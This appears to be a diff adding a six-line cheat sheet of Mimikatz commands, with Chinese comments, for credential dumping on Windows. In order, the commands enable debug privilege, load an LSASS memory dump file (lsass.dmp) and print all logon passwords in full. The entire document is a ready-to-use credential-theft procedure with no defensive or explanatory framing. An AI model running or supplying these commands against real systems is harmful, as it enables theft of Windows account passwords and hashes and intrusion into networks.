@@ -1,0 +1,6 @@
+//提升权限
+privilege::debug
+//载入dmp文件
+sekurlsa::minidump lsass.dmp
+//读取登陆密码
+sekurlsa::logonpasswords full
